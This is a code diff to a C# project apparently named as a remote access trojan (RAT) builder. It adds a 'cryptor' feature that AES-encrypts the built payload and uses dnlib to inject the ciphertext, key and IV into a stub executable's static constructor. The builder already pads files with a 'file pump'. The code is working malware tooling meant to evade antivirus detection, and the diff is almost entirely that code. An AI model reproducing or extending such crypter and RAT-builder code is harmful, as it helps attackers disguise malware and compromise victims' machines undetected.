@@ -11,6 +11,7 @@ using System.Windows;
 using System.Security.Cryptography;
 using dnlib.DotNet;
 using dnlib.DotNet.Emit;
+using System.ComponentModel;
 
 namespace ArkerRatWpfVersion
 {
@@ -104,6 +105,11 @@ namespace ArkerRatWpfVersion
                 
 
             }
+
+            if (cryptor)
+            {
+                Encrypt();
+            }
         }
 
         private void FilePump(int size)
@@ -112,6 +118,70 @@ namespace ArkerRatWpfVersion
             {
                 byte[] pump = new byte[size*1000];
                 fs.Write(pump, 0, pump.Length);
+            }
+        }
+
+        private byte[] GenerateUnicKey()
+        {
+            Random random = new Random(DateTime.Now.Millisecond);
+            string temp = string.Empty;
+            for (int i = 0; i < 16; i++)
+            {
+                temp += Convert.ToChar(random.Next(64,126));
+            }
+            return Encoding.UTF8.GetBytes(temp);           
+        }
+        private void Encrypt()                  
+        {
+            using(Aes aes = Aes.Create())
+            {
+                aes.Key = GenerateUnicKey();
+                aes.IV = GenerateUnicKey();
+                ICryptoTransform cT = aes.CreateEncryptor(aes.Key, aes.IV);
+                   
+                using(MemoryStream ms= new MemoryStream())
+                {
+                    using(CryptoStream cStream = new CryptoStream(ms, cT, CryptoStreamMode.Write))
+                    {
+                        using(FileStream fs = new FileStream(_path, FileMode.Open))
+                        {
+                            using(StreamWriter streamWriter= new StreamWriter(cStream))
+                            {
+                                byte[] file = new byte[fs.Length];
+                                fs.Read(file, 0, file.Length);
+                                streamWriter.Write(Convert.ToBase64String(file));
+                            }                          
+                        }
+                    }
+
+                    string eData= Convert.ToBase64String(ms.ToArray());
+                    using (var module = ModuleDefMD.Load(Path.Combine(Directory.GetCurrentDirectory() + "\\temp", "encr.exe")))
+                    {
+                        var targetype = module.GetTypes().First(type => type.Name == "Program");
+                        var data = targetype.FindField("data");
+                        var key = targetype.FindField("key");
+                        var iV = targetype.FindField("iV");
+                        var cctr = targetype.FindStaticConstructor();
+
+                        for (int i = 0; i < cctr.Body.Instructions.Count; i++)
+                        {
+                            var instruction = cctr.Body.Instructions[i];
+                            if (instruction.OpCode == OpCodes.Stsfld && instruction.Operand == data)
+                            {
+                                cctr.Body.Instructions[i - 1] = OpCodes.Ldstr.ToInstruction(eData);
+                            }
+                            else if(instruction.OpCode == OpCodes.Stsfld && instruction.Operand == key)
+                            {
+                                cctr.Body.Instructions[i - 1] = OpCodes.Ldstr.ToInstruction(Convert.ToBase64String(aes.Key));
+                            }
+                            else if (instruction.OpCode == OpCodes.Stsfld && instruction.Operand == iV)
+                            {
+                                cctr.Body.Instructions[i - 1] = OpCodes.Ldstr.ToInstruction(Convert.ToBase64String(aes.IV));
+                            }
+                        }
+                        module.Write(_path);
+                    }
+                }
             }
         }
     }
